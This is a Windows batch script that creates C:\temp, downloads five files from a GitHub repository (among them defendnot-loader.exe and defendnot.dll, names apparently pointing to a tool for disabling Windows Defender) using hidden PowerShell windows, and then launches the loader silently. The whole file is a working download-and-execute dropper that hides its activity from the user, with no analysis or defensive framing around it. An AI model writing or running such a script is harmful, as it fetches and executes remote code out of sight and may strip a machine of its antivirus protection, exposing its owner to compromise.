@echo off
setlocal

:: Target directory
set "targetDir=C:\temp"

:: Create folder if it doesn't exist
if not exist "%targetDir%" (
    mkdir "%targetDir%"
)

:: Define URLs and filenames
set "url1=https://raw.githubusercontent.com/sabeloe/defnot/main/ctx.bin"
set "file1=ctx.bin"

set "url2=https://raw.githubusercontent.com/sabeloe/defnot/main/defendnot-loader.exe"
set "file2=defendnot-loader.exe"

set "url3=https://raw.githubusercontent.com/sabeloe/defnot/main/defendnot-loader.pdb"
set "file3=defendnot-loader.pdb"

set "url4=https://raw.githubusercontent.com/sabeloe/defnot/main/defendnot.dll"
set "file4=defendnot.dll"

set "url5=https://raw.githubusercontent.com/sabeloe/defnot/main/defendnot.pdb"
set "file5=defendnot.pdb"

:: Function to download each file using hidden PowerShell
call :download "%url1%" "%targetDir%\%file1%"
call :download "%url2%" "%targetDir%\%file2%"
call :download "%url3%" "%targetDir%\%file3%"
call :download "%url4%" "%targetDir%\%file4%"
call :download "%url5%" "%targetDir%\%file5%"

:: Auto-run the downloaded EXE (hidden)
set "exePath=%targetDir%\defendnot-loader.exe"
if exist "%exePath%" (
    powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%exePath%' -WindowStyle Hidden"
    echo defendnot-loader.exe launched silently.
) else (
    echo defendnot-loader.exe not found.
)

endlocal
exit /b

:download
echo Downloading %~2 ...
powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%~1' -OutFile '%~2'" >nul 2>&1
if exist "%~2" (
    echo Success: %~2
) else (
    echo Failed: %~2
)
exit /b

